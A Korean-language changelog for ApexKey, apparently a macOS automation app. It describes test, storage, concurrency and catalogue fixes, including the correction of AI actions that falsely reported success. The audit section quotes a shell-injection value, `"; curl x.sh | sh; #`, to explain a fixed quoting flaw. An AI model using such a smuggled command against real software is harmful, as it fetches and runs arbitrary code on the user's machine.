# ApexKey — 변경 이력

> 형식: `{날짜} {platform} {error_code/부가} — 내용`
> 프로젝트 전체 변경 내역은 이 파일에 기록합니다.

## 2026-09-29 macos — CI 실패 1건 수정: 호스트 권한에 의존하던 테스트 (T-184)

> PR #7의 첫 CI에서 `MenuActionPathTests.testMissingMenuItemProduces1728` 1건이 실패했다.
> **로컬에서는 항상 통과한다.** 테스트 451건 0실패인데 CI만 빨갛다.

### 원인

GitHub Actions 러너에는 **접근성 권한이 없다.** 그래서 없는 메뉴 항목을 클릭하는
osascript가 -1728이 아니라 **권한 오류**로 실패한다. 즉 그 테스트는
**-1728 분류 로직이 아니라 러너의 권한 상태를 측정**하고 있었다.
`/Applications/Notes.app` 픽스처 의존 실패와 같은 종류다 — 호스트 환경에 걸린 단언.

### 수정

`AXIsProcessTrusted()`로 게이팅하지 **않고**, `System Events`에 실제로 접근해
**측정 가능 여부를 probe로 확인**한다. osascript는 우리 프로세스와 별개의 TCC
컨텍스트에서 실행되므로 우리 프로세스의 권한과 일치하지 않기 때문이다.

probe가 실패하면 `XCTSkipUnless`로 사유(실제 오류 앞 160자)를 남기고 건너뛴다.
로컬에서는 probe가 성공해 **테스트가 그대로 실행된다** — 커버리지를 잃지 않는다.

> 교훈: **로컬 테스트 통과가 CI 통과를 보장하지 않는다.**
> PR을 올리기 전 CI가 유일하게 다른 호스트다 — 그때만 보이는 결함이 있다.

## 2026-09-29 macos — 클린 빌드 경고 13건(7종) 제거 (T-183)

> `xcodebuild clean build` 기준 **경고 0건**. 점진 빌드는 경고를 숨겨서 0처럼 보인다.
> **이번에 제거한 13건 중 1건은 오늘 새로 쓴 코드였다** (`HTMLToMarkdown`).

| 종류 | 건 | 조치 |
|---|:-:|---|
| `onChange(of:perform:)` deprecated | 2 | 2-인자 `onChange(of:)` 로 migration. 동작 동일 |
| `activateIgnoringOtherApps` deprecated | 1 | 제거. macOS 14부터 **효과가 없다** |
| `weak` 캡처 소유권 어긋남 | 2 | 바깥 클로저에도 `[weak self]` 명시 |
| `hideToast()` main-actor 격리 위반 | 1 | `MainActor.assumeIsolated` (전제 주석 명시) |
| `undo:`/`redo:` 해석 실패 | 2 | `NSSelectorFromString` — **아래 함정 참조** |
| `hotKeyID` 불필요한 `var` | 2 | `let` 로. 단 3번째 사용처는 `inout` 이라 `var` 유지 |
| AppIcon 고아 파일 | 1 | 중복본 삭제 (아래 참조) |

### 함정 1 — `undo:`/`redo:`는 메서드를 선언하면 동작이 깨진다

컴파일러 경고는 "AppDelegate에 `undo:` 메서드 없음"이지만, 실제로는 **target이 nil이라
responder chain이 처리한다**(`NSTextView`·`UndoManager`가 구현). AppDelegate에 빈
`@objc func undo(_:)`를 추가해 경고를 끄면 **AppDelegate이 target이 되어 버려
Cmd+Z가 죽는다.** `NSSelectorFromString`으로 런타임에 만들어 정적 검사를 우회했다.

### 함정 2 — 같은 이름이라도 호출 API에 따라 `var`/`let` 가 다르다

`hotKeyID`를 일괄 `let` 로 바꾸려 했다가 컴파일 에러. `GetEventParameter`는
**inout으로 채워주므로** `var` 가 맞고, `RegisterEventHotKey`는 **값으로 받아서**
`let` 이 맞다. 되돌린 뒤 주석에 구분 근거를 남겼다.

### AppIcon 중복본

`icon_1024.png`이 `Contents.json`에 없어 unassigned child 경고. macOS appiconset엔
1024 슬롯이 없다(512@2x = 1024px가 그 역할). **SHA-256을 비교해
`icon_512x512@2x.png`과 바이트 단위로 동일함**을 확인한 뒤 삭제했다 — 내용 손실 없음.

### 부수

`Contents.json`을 python으로 재직렬화하면 Xcode 포맷(`"key" : value`)과 달라
diff가 88줄로 부풀었다. **변경이 필요 없었으므로 `git checkout`으로 원복**했다.

## 2026-09-29 macos — 저장 계층 복구·debounce + 키 입력·HTML 3종 + Run Shortcut UI (PLAN_v0.26, T-175~T-182)

> 테스트 381 → **451건 0실패**(2 skip). 액션 구현 55 → 59종. i18n 876 → 891키.
> **`TODO.md`의 "바로 착수 가능 6건"을 전부 처리했다.**

### ★ 가장 중요한 발견: `JSONEncoder`의 키 순서는 프로세스마다 다르다

`outputFormatting`을 지정하지 않으면 내부 딕셔너리를 거치는데, **Swift의 `Hasher`
시드는 프로세스마다 무작위**라 같은 값도 프로세스를 넘기면 바이트가 달라진다.
(실측: `ShortcutPermissions`를 두 번 인코딩해 **165바이트로 길이는 같은데 내용이 달랐다**)

`StoreCoding`을 `.sortedKeys`로 고정했다. 이게 고쳐지지 않았으면 아래 blob 복구 가드가
**간헐적으로 열려 사용자 원본 데이터를 조용히 덮어썼을 것**이다. 원래부터 있던 잠재
결함이 "바이트를 비교하는 코드가 생기면서" 드러났다.

### 손상 blob 컬럼의 영구 쓰기 잠금에 복구 경로 (E-MAC-STORE-5010)

해제 지점이 `load()`·`removeShortcut`뿐이라 한 번 손상되면 **영구 잠금**이 되고 복구
방법은 "동작 삭제"뿐이었다. 데이터는 안 사라지지만 **편집이 반영되지 않는다.**

해제 조건 3개(모두 만족): 인코딩 성공 · 왕복 성공 · **손상 시점 fallback과 다름**.
**3번이 핵심이다.** 처음엔 1·2(왕복)만으로 충분하다고 생각했는데 틀렸다 — fallback인
`[]`도 왕복에 성공하므로, 왕복만 보는 가드는 **자기 목적(원본 보호)을 무력화**한다.
테스트가 이 결함을 실제로 잡아냈다. 값의 **출처**를 추적해야 구별할 수 있다.

컬럼은 독립적이다 — steps만 편집하고 triggers를 안 건드리면 triggers 잠금은 유지된다.
"옆 컬럼이 풀렸으니 이건 자동 해제"라는 가정으로 전체를 풀면 손상 원본이 사라진다.

### 저장 debounce (E-MAC-STORE-5011)

`updateShortcutSteps`만 합치고, **명시적 뮤테이션(추가·삭제·이름)은 합치지 않는다.**
명시적 동작을 합치면 "추제한 게 잠깐 안 보인다"는 불안이 생긴다. 빈도가 다른 두
경로를 구분한 것이 요점이다. 종료 시 `flushPendingSaves()`로 유실 방지.
`queue.sync`는 쓰지 않았다 — 같은 큐에서 호출하면 즉시 데드락한다(`@MainActor` 테스트와
`.main` 기본 큐라 반드시 만난다).

### 키 입력·HTML 3종 (E-MAC-TEXT-6003)

`typeText`·`typeNumber`·`htmlToMarkdown`. **계시와 계획을 분리**했다 —
`TypingActions.plan(_:)`은 순수 함수다. 키 입력은 권한이 없으면 **조용히 무응답**이
되므로 그대로 테스트하면 "보냈지만 아무 일도 안 일어난" 성공처럼 보인다.
**한글을 절대 자르지 않는다**(Character 경계에서만). 숫자가 아니면 0으로 바꾸지 않고
실패시킨다. HTML 파서는 Foundation 대신 자체 구현(Foundation은 WebKit 의존 + 샌드박스
밖 접근 시도)이며, **태그가 하나도 없으면 원문을 돌려주지 않고 실패**시킨다.

### Run Shortcut 전용 설정 UI (E-MAC-FLOW-7011)

조사 결과 **엔진은 정상이었고 설정 UI가 없었다** — `DefaultSettingsView`로 떨어져
사용자가 UUID를 직접 입력해야 했다. 전용 피커를 추가했다.
**`ThemedRoot`가 store를 주입하지 않아 `@EnvironmentObject` 접근 시 런타임 크래시가
날 뻔한 것**을 함께 막았다(빌드는 통과한다).

### 테스트가 잡은 실제 버그 (이번에 처음 쓰기 전 상태)

1. 괄호 중첩 깊이 제한이 `parsePrimary`에서 리셋 (T-172)
2. 엔티티 디코딩이 `&amp;` → `&;` — 닫는 `;` 잔존
3. 링크 href가 `[링크](Optional("https://…"))`
4. 닫는 태그만 있는 입력이 "HTML 아님"으로 오판

### 문서 (T-182)

`[~]` 표기 도입 — **`[x]`도 `[ ]`도 아닌 "무효화"**. 구현하지 않는 게 의도이며
되살리면 안 된다. T-132/T-135/L-09의 코드 주장을 재검증했다.
L-09의 "키 N 전수 존재"는 **숫자를 문서에 고정하지 않고** 결함으로만 기록한다 —
키 수는 계속 늘어나므로 숫자를 쓰면 또 낡아진다.

### 정정

- **"빌드 경고 0"은 과장이었다.** 클린 빌드에 **경고 7종**이 있다
  (캐시된 빌드는 재컴파일 때만 경고를 보여준다)
- 테스트 픽스처가 격리되지 않아 고립 실행과 전체 스위트 결과가 달랐다 —
  픽스처마다 전용 저장소로 격리. 다만 **정확한 기전은 특정하지 못했다**

## 2026-09-29 macos — 수치·날짜·목록 액션 12종 + 문서 구조 정비 (PLAN_v0.25, T-172~T-174)

> 테스트 335 → **381건 0실패**(2 skip). i18n 833 → 876키. 액션 구현 42 → 55종.

### 카탈로그 미구현을 12종 더 줄였다 (E-MAC-TEXT-6002)

`changeCase`·`sort`·`surroundText`·`wordCount`·`calculate`·`math`·`number`·
`outputDifference`·`base64Encode`·`hash`·`uuid`·`dateFormatter` 구현.
T-171에 이어서 미구현 115종 중 **순수 로직으로 가능한 것**을 먼저 처리했다
(남은 대부분은 Apple 앱 연동이라 ScriptingBridge가 필요하다).

- **계산기는 `eval`을 쓰지 않는다.** 재귀 하강 파서를 직접 구현했다.
  우선순위(`^` > 단항 `-` > `* / %` > `+ -`), 오른쪽 결합 거듭제곱, 괄호, 단항 마이너스,
  `×÷−` 수학 기호와 지수 표기를 지원하고 재귀 깊이 64로 제한한다
- **0으로 나누기는 명시적 실패다.** IEEE 754는 `inf`를 만들지만 그건 오류가 아니라
  조용히 이상한 값이다. 같은 이유로 `0.1+0.2` 부동소수점 노이즈는 정리한다
- **정렬에서 숫자가 아닌 항목은 뒤로 보낸다.** 0으로 취급하면 순서가 거짓말이 된다
- **MD5를 넣지 않았다.** 충돌이 실제로 만들어지는 해시를 "해시"라는 이름 아래
  제공하면 위험한 primitive를 제공하는 셈이다. CryptoKit의 SHA-256/512만

**테스트가 실제 버그 2건을 잡았다** (이 커밋 이전 상태):
1. 괄호 중첩 깊이 제한이 동작하지 않음 — `parsePrimary`가 괄호 안에서 `parse()`를
   depth 0으로 호출해 리셋했다. `((((...))))` 500중첩이 제한을 끝내 통과했다
2. 회귀 테스트의 기대값 오류 — "공백   많음"은 2단어지 3단어가 아니다

검증: `DataActionsTests` 46건 + 엔진 배선 테스트. `executeStep`의 데이터 액션 case를
지우면 배선 테스트가 26 assertion으로 실패함을 실측.

### 문서 구조 정비 (T-173)

### 미완료 항목을 따로 장부로 분리 (T-174)

"안 한 것"이 흩어져 있었다 — `STATUS.md` §5에 요약으로 있고, 실동작 항목은
`FUNCTIONAL_CHECKLIST.md` §8에 있고, 작업성 지연은 `TODO.md`에 흩어져 있었다.
나중에 확인하려고 하면 **어디를 봐야 하는지 알 수 없는** 상태였다.

- **`docs/OPEN_ITEMS.md`** 신규 — 의도적으로 하지 않은 것 / 할 수 없어서 못 한 것의
  장부. 6개 항목이 **완료 기준과 함께** 체크박스로 남아 있고, 나중에 확인하려면
  **여기에 체크**한다
- 실동작 52건의 세부는 옮기지 않고 링크만 걸었다 — 체크박스를 두 곳에 만들면
  어느 쪽이 밀린 항목이 되는지 알 수 없고, 이는 `FUNCTIONAL_CHECKLIST.md` §6이
  낡아진 것과 같은 종류의 문제다
- **집계를 바로잡았다**: 이전 보고에서 실동작을 "8건 + 23종 UI"라고 적었으나
  실제로는 §8 전체에 **52건**이 있었다(8-1 7·8-2 5·8-3 4·8-4 5·8-5 4·8-6 5·
  8-7 8·8-8 14). 새로 추가한 것만 세고 있었다

5·6번 항목(`plans/` 정리, `TODO.md` 재배치)은 **하지 않기로 판단한 것**이라
체크박스를 두면 "결정을 뒤집겠다"는 뜻이 된다. 완료 기준에 그 사실을 적어 뒀다.

문서가 흩어져 있고 "무엇이 출처인가"가 문서에 없었으며, 실제로 **낡은 문서가 중복
착수를 유발**한 적이 있었다(`FUNCTIONAL_CHECKLIST.md` §6이 이미 고친 항목을 미해결로
표시). 이번에 구조를 잡았다.

- **`docs/README.md`** 신규 — 문서 색인. 어떤 문서가 무엇의 유일한 출처인지,
  새 세션이 무엇부터 읽는지, **알려진 문서 결함**(예: `check-localizable.py`는 키
  존재를 검사하지 않는다)이 여기 적힌다
- **`docs/STATUS.md`** 신규 — 진행 현황·막힌 것·안 한 것의 단일 출처.
  "실제로 밟은 함정"만 적고 추측은 넣지 않았다
- **`TODO.md`** 최상단에 미해결 **14건** 요약 인덱스 추가 — 427줄 문서에서
  미해결을 찾으려면 끝까지 스크롤해야 했다
- **`FUNCTIONAL_CHECKLIST.md`** §6에 "감사 스냅샷이라 낡아진다 — 착수 전 코드와
  대조할 것" 경고 추가. §8-8 신설(텍스트/데이터 액션 23종 UI 확인 14항목)
- **`docs/OPEN_ITEMS.md`** 신규 (T-174) — 미완료 항목 장부

## 2026-09-29 macos — 텍스트 액션 11종 구현 (PLAN_v0.24, T-171)

> 테스트 335건 0실패(2 skip). i18n 802 → 833키.

### 카탈로그에 있던 11종을 실제로 동작하게 (E-MAC-TEXT-6001)

`text`·`combineText`·`splitText`·`trimWhitespace`·`replaceText`·`regex`·`matchText`·
`count`·`formatNumber`·`getClipboard`·`setClipboard` 11종이 `ActionType`에는 있었으나
구현은 0이었다. 즉 **카탈로그에는 노출되고 실행하면 "미구현" 토스트**가 떴다 —
T-159가 고친 바로 그 상태가 백로그에 남아 있었다.

- `TextActions` — 순수 함수(클립보드 2종만 주입 가능하게 분리). 의존성 0이라
  테스트가 쉽고 실행이 메인을 블로킹하지 않는다
- **실패를 빈 문자열로 뭉개지 않는다.** `Outcome.failure(사유)`가 잘못된 패턴·
  빈 입력·숫자 아님을 구분해 돌려준다. "결과가 비었다"와 "패턴이 틀렸다"를
  사용자가 구분할 수 있어야 한다
- 숫자→읽기는 한국어 단위어(만/억/조)를 하드코딩하지 않고 `NumberFormatter.spellOut`에
  맡겼다. 하드코딩하면 영어 로케일에서 엉뚱한 값이 나오고, 현지화 가드를 통과시키려고
  예외를 늘려야 했다
- 파라미터는 `target`이 아니라 `actionParameters`에 — `target` 한 줄로는 2입력
  액션("찾을 문자열 → 바꿀 문자열")을 표현할 수 없다

### 전용 설정 UI가 없으면 또 그 상태가 된다

`implementation == .implemented`인 액션은 카탈로그에서 **선택된다.** 전용 UI 없이
`DefaultSettingsView`로 두면 "정규식"을 골라도 패턴을 입력할 곳이 없다 —
**선택은 되지만 쓸 수 없는** T-159가 고친 상태가 그대로 되돌아온다.
그래서 `TextActionSettingsView`를 함께 넣고, 액션마다 필요한 입력만 노출한다.

### 카탈로그 정합성 가드가 정확히 작동했다

`testKnownUnimplementedRemainPlanned`가 11종이 `planned`가 아니라고 실패했다
(9 assertion). 목록에서 빼고 **역방향 가드** `testTextActionsStayImplemented`를
추가했다 — 구현을 되돌렸는데 정의를 그대로 두면 카탈로그가 "준비 중"으로 숨기지만
실제로는 동작하는, 설명과 반대의 상태가 되기 때문이다.

**검증** — 순수 함수만 테스트하면 **배선을 놓친다.** 카탈로그가 "구현됨"이라 말해도
`executeStep`에 case가 없으면 `.planned`일 때와 똑같이 실패한다. 그래서 11종을
**엔진 경유로** 실행하는 테스트를 추가했다. `executeStep`의 텍스트 case를 지우면
이 테스트들이 실패한다(21 assertion) — 실측 확인.

### 부수 수정

- `executeStopShortcut`의 `?? .null` — `lastOutput`이 비옵셔널이라 죽은 분기.
  캐시된 빌드에서는 경고가 재컴파일 때만 나와 세션 로그의 "빌드 경고 0"이
  과장이었다
- `runAutomation`이 `@Sendable` 클로저에 `var context`를 캡처 — Swift 6 언어 모드에서
  오류가 된다. 컴파일러가 증명할 수 없으므로 컨텍스트 구성을 백그라운드 안으로 옮겨
  아예 만들지 않게 했다
- i18n 31키 추가. **`check-localizable.py`는 키 존재를 검사하지 않는다** —
  없는 키는 게이트를 통과하고 UI에 원문 키로 노출된다. ko/en 833키 일치 확인

## 2026-09-29 macos — 저장 계층 안전 + 실행 엔진 백그라운드화 (PLAN_v0.23, T-167~T-170)

> 인계 문서 `SESSION_2026-09-27_handoff.md` §3의 2·3·4순위를 한 번에 착수.
> 테스트 247 → **294건 0실패**(2 skip). 새 테스트 38건. 빌드 경고 0.

### 데이터 소실 — 스키마 버전 관리만으로는 안 된다 (T-167, T-168)

인계 문서가 경고한 "`ShortcutPermissions`에 필드를 추가하면 JSONDecoder가 전 레코드에
실패 → 4컬럼 영구 쓰기 잠금"의 실체를 파고들었다. **원인은 두 개였고, 하나만 고치면
끝이 아니었다.**

- **(1) 컬럼 계층** — `VersionedSchema`가 없어 필드 추가가 이관 불가 신호조차 없었음.
  `ConfigSchemaV1` + `ConfigMigrationPlan`을 도입했다. 마이그레이션 stage는 비어 있는데
  이 상태가 안전하다(무버전 → v1 경량 이관만 수행). 위험한 건 도입 자체가 아니라
  **무버전 store가 새 계획으로 열리는가**였는데, 못 열면 `quarantineStore`가 발동해
  전 사용자 설정이 격리된다. 그 경로를 `ConfigSchemaMigrationTests`가 고정한다
- **(2) blob 계층 — 이것이 진짜 원인이었고 `VersionedSchema`는 손대지 못한다.**
  `stepsData`·`permissionsData`는 불투명한 `Data`라 SwiftData 마이그레이션이 무관하다.
  게다가 Swift의 합성 `Decodable`은 **프로퍼티 기본값을 무시한다** —
  `var requiresConfirmation: Bool = false` 여도 JSON에 키가 없으면 `keyNotFound`를 던진다.
  → `ShortcutStep`·`ShortcutPermissions`·`Variable`에 관대 `init(from:)` 추가
  (전 필드 `decodeIfPresent ?? 기본값`). 새 필드 추가는 컴파일 에러로 감지된다

**검증** — `requiresConfirmation`을 `decodeIfPresent` → `decode`로 되돌리면 4개 테스트가
동시에 실패하고 `undecodableBlobColumns()`에 `["permissions"]` **영구 쓰기 잠금이 재현**된다.

### UI 정지 — 핫키 실행이 메인 스레드를 블로킹 (T-170)

핫키 콜백이 메인 스레드에서 `executeWithDetail`을 동기 호출했다. `wait 60초` 단계 하나면
메뉴바·패널이 60초 정지. `Process.waitUntilExit`·`pauseUntilInput`도 같았다.

`ExecutionEngine.executionQueue`(**직렬**) + `ConfigStore.runOffMainThread`로 실행만
백그라운드로 옮겼다. MainActor 상태(통계·토스트·저장)는 메인에서만 만진다.

**왜 `.global`이 아니라 직렬 큐인가**: 실행 횟수가 아니라 **상태가 하나뿐인 싱글턴**이 있다.
`ActionExecutor.pauseSemaphore`(사이보그 모드 대기 세마포어)와 `pauseMonitor`(NSEvent
모니터)가 각각 하나뿐이라, 두 실행이 겹치면 나중에 시작한 쪽이 앞선 대기를 깨뜨린다.
메인 동기 실행이 공짜로 보장하던 이 직렬성을 직접 보존해야 한다.

`shortcutProvider`는 이제 오프메인에서 불리므로 `shortcuts` 접근을 메인으로 한 번 홉한다.
교착은 없다 — 실행 큐가 직렬이고 메인이 실행 큐를 기다리지 않는다(메인을 막던 동기
실행을 이번 커밋에서 제거했으므로). 단계 테스트도 같은 큐로 통일했다.

**검증** — 동기 실행으로 되돌리면 3개 테스트가 실패한다 (실측):
`testExecuteShortcutStatsReturnsBeforeExecutionFinishes` 1.505초 vs 임계 0.4초 ·
`testHandleHotKeyDoesNotBlockOnLongStep` 1.515초 vs 0.4초 ·
`testMainThreadRemainsResponsiveDuringExecution` "1.016초간 응답하지 않았다 — UI가 정지했다"

### ConfigStore 테스트 0건 해소 (T-169)

`init()`이 `storeURL`을 하드코딩해 인스턴스화가 불가능했고, 그 결과 바인딩 추가·교체·삭제,
앱 제거 시 고아 핫키 정리, 동작·스크립트 저장 같은 모든 뮤테이션 경로가 검증되지 않았다.
`init`를 주입 가능하게 만들고(`storeDirectory`·`defaults`·`seedInstalledApps`·
`registerSystemIntegrations`, 기본값은 전부 기존 동작) 테스트 23건을 추가했다.

`UserDefaults.standard` 하드코딩 17곳을 주입된 `defaults`로 교체했다.

### 테스트 설계에서 배운 것 (회귀 테스트가 통과했는데 아무것도 안 잡던 사례)

- **하트비트 테스트가 통과했는데 판별력이 없었다.** 실행이 **끝난 뒤**에 메인 틱을
  셌기 때문이다. 실행이 끝나면 메인은 다시 자유롭다. 실행 구간 *안*을 봐야 한다
- **단일 경로를 가리키는 테스트는 통과해도 무의미하다.** `setLaunchBinding` 회귀
  테스트를 "다른 앱과 겹치는 조합 추가"로 썼더니 구버그 구현에서 통과했다. 실제 버그
  조건은 "자기 바인딩을 겹치는 조합으로 교체"였다 (이 경우에만 `removeBinding`이 먼저
  호출돼 핫키가 사라진다)
- **`RunLoop.main.run` 수동 펌프는 전체 스위트에서 불안정**하다. 단독 실행에선 됐지만
  XCTest 루프와 충돌했다. 메인 응답성은 `await MainActor.run` 왕복 지연으로 잰다
- **픽스처가 호스트에 의존하면 조용히 무의미해진다.** `/Applications/Notes.app`을
  경로로 썼다가 이 기기에 없어 두 앱이 모두 prune되어 실패했다

## 2026-09-29 macos — 무서명 릴리스 고지 정직화 (PLAN_v0.22, T-166)

> 인계 문서 `SESSION_2026-09-27_handoff.md` §3 1순위 착수. 사용자 결정 **(b) 문구 정직화** —
> Developer ID 서명·공증은 Apple Developer Program 가입이 선행이라 보류.
> 코드 변경 없음. 테스트 247건 0실패(2 skip) 재확인.

### 무엇이 문제였나

릴리스 노트 템플릿은 Gatekeeper 차단을 안내했지만 **더 큰 불편은 말하지 않았다.**
배포본이 `CODE_SIGNING_ALLOWED=NO`로 무서명인 반면, T-029는 "고정 TeamID 서명 → CDHash 유지 →
접근성 권한 유지"로 권한 초기화를 고친 작업이었다. **무서명 배포본에서는 이 수정이 성립하지 않는다.**
macOS TCC는 접근성 권한을 앱의 코드 서명(CDHash)에 묶는데, 서명이 없으면 버전마다 그 값이
달라져 **사용자는 업데이트할 때마다 손쉬운 사용 권한을 재승인해야 한다.**

안내되지 않은 이상한 동작이라 사용자는 "버전업하면 권한이 풀리는 버그"라고 생각했을 것이다.
버그가 아니라 배포 방식의 귀결이라는 사실이 문서에 없었다.

### 변경 4곳

- **`README.ko.md` / `README.md`** — 설치 절에 "⚠️ 서명 상태" 절 신설.
  증상 2종(Gatekeeper 차단 / 업데이트마다 권한 재승인) 표 + 대응 + CDHash 기술적 원인 +
  "소스 빌드는 자동 서명이라 권한 유지" 안내. 설치 단계에 "첫 실행은 우클릭 → 열기" 추가
  (기존엔 다운로드 → 이동 → 권한 허용 3단계였고, Gatekeeper를 안내하지 않아 그대로 막혔다)
- **`release-notes/_template.md`** — "알려진 제약" 절 신설. **릴리스마다 복사해 넣으라고 명시**
  (서명 도입 시 삭제). 작성 규칙에 "Gatekeeper만 쓰고 권한 재승인을 누락하지 말 것"을 규칙으로 추가
- **`website/ko/index.html` / `website/index.html`** — 다운로드 절에 고지 1문단

### 문서 정합

- `docs/FUNCTIONAL_CHECKLIST.md` §6 — 감사 스냅샷이 **이미 수정된 항목(T-146/T-147/T-164/T-165)을
  🔴·⚠️로 표시**하고 있어 다음 세션이 중복 착수할 뻔했다. 커밋 해시와 함께 ✅로 갱신
- §8 한계 7번 — "T-166, (b) 결정으로 문서화 완료"로 상태 변경
- `docs/TODO.md` — v0.22 절 신규. T-166 `[x]` + Developer ID 서명 후속을 **보류** 항목으로 명시

## 2026-09-27 macos — 감사 결함 수정 (PLAN_v0.21)

> 5개 계층 정밀 감사(실행 엔진 / 저장소 / AX·액션 / 핫키·자동화 / 문서 정합) 결과 25건 수정.
> 테스트 171 → **247건 0실패**(2 skip). 새 회귀 테스트 76건. 빌드 경고 0. i18n ko/en 810키 일치.

### P0 — 앱 정지 · 크래시 · 거짓 성공 · 데이터 소실

- **E-MAC-SCRIPT-6004** — `waitUntilExit()` 후 `readDataToEndOfFile()` 순서로 4곳 동일 패턴. 파이프 버퍼(64KiB) 초과 시 자식이 write에서 블로크되어 부모가 종료 대기를 끝내지 않으므로 **영구 교착**. 핫키 경로가 메인 스레드라 교착 시 핫키·패널·메뉴바가 전부 정지했다(강제종료 외 복구 불가). 트리거: `cat 큰 로그`·`find /`·`adb logcat -d`·`curl`·`git log -p` → `ProcessRunner` 신규(종료 대기와 출력 드레인을 병렬 수행, 선택적 timeout + SIGTERM/SIGKILL 폴백)
- **E-MAC-VAR-1002** — `String(Int(v))` 크래시. `inf`·`NaN`은 `v == v.rounded()`가 참이라 `Double→Int` fatalError가 났다. 도달 경로: `inferValue`의 `Double("inf")`·list/dictionary 재귀·디코딩된 blob → 2^53 미만 + 유한일 때만 변환
- **E-MAC-AI-9013** — AI 3종이 FoundationModels를 호출하지 않으면서 `return true`를 반환했다. `useModel`은 입력 프롬프트를 그대로 출력 변수로 저장, `writingTool`은 "[Proofread] {원문}" 문자열 래핑, `imagePlayground`는 512×512 단색 사각형에 프롬프트를 그린 플레이스홀더를 tmp에 기록하고 "이미지 생성 완료"로 로그. `AIAvailabilityManager`도 macOS 26 이상이면 무조건 `.available`을 반환해 Apple Intelligence가 꺼진 기기에서도 "사용 가능"로 표시됐다 → 3종 모두 실패 반환, 가용성 판정 정직화, **공개 광고(README·랜딩 페이지) 정정**
- **E-MAC-HTKEY-1003** — `setLaunchBinding`이 `removeBinding` **후** `addBinding`을 호출했고, `addBinding`은 중복 조합이면 조용히 `return`했다. 교체 실패 시 **작동하던 핫키만 사라진 채** 사용자에게 아무 신호가 없었다. 예약 핫키(⇧⌥A/⌘⌥K/⇧⌥S/⌘⇧↩)와 겹치면 발동 → 삭제 전 사전 검증. 동시에 `HotKeyRecorderView.onRecord`가 `(HotKeyCombo) -> Void`라 수락 여부를 표현할 수 없어 무조건 "적용되었습니다"를 표시하던 문제도 `String?` 반환으로 해결
- **E-MAC-REL-9301** — `CFBundleShortVersionString`이 `1.0`으로 고정돼 있었고 `release.yml`의 태그-버전 대조가 `exit 1` 하므로 **다음 릴리스가 반드시 실패**했다. 근본 원인은 xcodegen이 매 빌드 Info.plist를 재생성해 1.3.0 범프가 되돌아간 것이었다 → `project.yml`의 `MARKETING_VERSION`을 단일 출처로 만들고 plist는 변수로 치환. `scripts/check-version.py` 게이트를 build/CI/release 3곳에 연결

### P1 — 오동작 · 무음 실패

- **E-MAC-SCRIPT-6004(인젝션)** — 셸 경로에 인용 처리가 아예 없었음(AppleScript 경로만 `appleScriptQuoted` 보유). `{clipboard}`에 `"; curl x.sh | sh; #`가 들어가면 실행 → `ShellEnvironment.literal` + `resolveText(escaping:)` 도입
- **E-MAC-FLOW-7009** — 실행 결과 전파 4종 결함: ① `executeRepeatCount`/`Each`가 내부 `success:false`를 버리고 무조건 성공 반환 ② `execute(steps:)`가 `error` 문자열을 버려 구체적 원인 유실 ③ `stop`/`ended` 경로가 누적 실패를 삼킴 ④ 셸 단계가 stdout 대신 **스크립트 소스코드**를 출력 변수로 기록 ⑤ 일반 액션 `default:` 분기가 `setOutput` 자체를 호출하지 않음
- **E-MAC-STORE-5007** — `removeApp`가 바인딩·Carbon 핫키를 남겼다. `pruneRemovedApps()`가 **매 실행** 호출되므로 **외장드라이브를 뽑으면** 앱은 목록에서 사라지는데 고아 핫키는 매번 재등록되어 죽은 bundleID로 실행을 시도했다
- **E-MAC-STORE-5008** — `showHiddenApps`에 `didSet`·`PrefKeys`·복원이 모두 없어 설정 토글이 매 실행 리셋됐다
- **E-MAC-UX-9011** — 테마 활성 ID 키 이중 정의(`ApexKeyActiveThemeId` vs `activeThemeId`)로 `loadActiveThemeId()`가 항상 nil, `loadActiveTheme()`는 죽은 경로, 활성 테마 삭제 시 참조 정리도 실행되지 않았다 → 단일 키로 통합
- **E-MAC-AUTO-8002** — `FSEventStreamRelease`을 콜백 큐 동기화 없이 호출해 use-after-free 창이 열렸다 → 전용 큐를 static 관리하고 해제 전 barrier로 in-flight 콜백 대기
- **E-MAC-MENU-7007** — 오류 분류가 실측과 달랐다. 없는 메뉴 항목·없는 메뉴바 항목·빈 세그먼트가 **전부 `-1728`**인데 `appNotRunning`은 `-600`에 연결돼 있어(실측으로 나타나지 않음) 도달 불가했고, `-1743`(Automation TCC 거부)은 "손쉬운 사용 권한 없음"으로 오표기됐다 → `.automationDenied` 분리
- **E-MAC-MENU-7008** — `menuPath`가 빈 구 레거시 바인딩은 `click menu item "X" of menu 1 of menu bar item "X"`를 생성해 **구조적으로 100% 실패**했다. 게다가 `ApexKeyStoreTests`가 이 실패 경로를 의도된 동작으로 green 고정하고 있었다 → 최상위 메뉴 클릭으로 분기 + 테스트 갱신
- **E-MAC-CAT-9401** — `ActionType` 153종 중 실제 실행은 28종(18%)인데 125종 미구현이 구분 없이 카탈로그에 노출됐다. 선택해도 빈 설정 창이 열리고 실행해야야 알 수 있었다 → `default:` 없이 153개를 전수 나열하는 switch 도입으로 **컴파일 타임 정합성** 확보. 카탈로그는 구현 완료분만 기본 노출, 나머지는 "준비 중"/"연동 미구현" 배지 + 선택 차단
- **E-MAC-AUTO-8003** — 사이드바 배지와 브라우저 카드가 미구현 트리거 8종을 집계해 "배지 4 / 실제 등록 0" 상태가 가능했다 → 실제 등록 기준 집계. README가 광고하던 디스플레이·Wi-Fi·블루투스·앱 트리거 4종 정정
- **E-MAC-SYS-8006** — `androidMirrorScriptPath`가 개발 머신 절대경로를 `preferred`로 하드코딩해 **앱 밖의 임의 파일을 실행**하고 스크립트 편집 저장 시 덮어썼다 → Application Support 경로만 사용
- **T-164** — `build_and_run.sh test`의 smoke/unit/full 3분기가 완전히 동일했고, xcodebuild 실패가 `| tail`에 삼켜져 **항상 exit 0**으로 끝났다(CI가 통과한 것처럼 보이면서 테스트는 실패) → 실제 스코프 분리 + `PIPESTATUS` 전파. 시나리오 중 **없는 프로세스 osascript가 5.5초** 걸리는 것을 실측 발견해 데드라인을 5초→10초로 상향

### 정리

- 죽은 코드 6종 삭제 — `isUsableKeyCode`·`moveBinding`·`moveStep`+`MoveDirection`·`AutomationManager.stopAll`·`Result.stopped()` (모두 호출 0건 확인 후)
- `applicationWillTerminate`가 로그만 남기던 문제 → `AutomationManager.unregisterAll` + `HotKeyService.unregisterAll` + `toastTimer` 정리 배선
- 죽은 자산 — 미사용 스크립트 6개(`build_strings`·`comprehensive_replace`·`localize_all`·`replace_strings`×3), 시스템 탭 삭제 잔재 i18n 키 9건
- `runsInBackground`가 12종 전부 `true`를 반환하던 판정 없는 속성 → `isWatcherSupported`를 따름
